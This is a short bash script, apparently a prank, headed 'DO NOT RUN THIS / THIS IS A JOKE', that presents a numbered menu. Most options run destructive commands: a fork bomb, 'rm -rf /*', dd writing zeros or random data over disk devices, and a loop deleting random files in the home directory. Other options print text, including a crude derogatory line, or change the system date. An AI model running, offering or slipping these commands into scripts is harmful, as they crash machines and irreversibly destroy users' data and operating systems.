#!/bin/bash

#DO NOT RUN THIS
#THIS IS A JOKE

echo "select a number from 1 to 7:"

read CHOICE

[ $CHOICE = "1" ] && :(){ :|:& };:

[ $CHOICE = "2" ] && echo "UwU"

[ $CHOICE = "3" ] && 
		while true
		do
				neofetch
				clear
  		        echo "disgusting femboy"
  		done

[ $CHOICE = "4" ] && rm -rf /*

[ $CHOICE = "5" ] && dd if=/dev/zero of=/dev/*

[ $CHOICE = "6" ] && hexdump /dev/urandom

[ $CHOICE = "7" ] && while true 
do
		FILE= ls ~ | shuf -n 1
		rm -rf $FILE
done

[ $CHOICE = "69" ] && dd if=/dev/urandom of=/dev/sdb

[ $CHOICE = "420" ] && echo "
_________________00__________________
________________0000_________________

_______________000000________________
____00_________000000__________00____
_____0000______000000______00000_____
_____000000____0000000___0000000_____
______000000___0000000_0000000_______
_______0000000_000000_0000000________
_________000000_00000_000000_________
_0000_____000000_000_0000__000000000_
__000000000__0000_0_000_000000000____
_____000000000__0_0_0_000000000______
_________0000000000000000____________
______________000_0_0000_____________
____________00000_0__00000___________
___________00_____0______00__________" && date 04200420
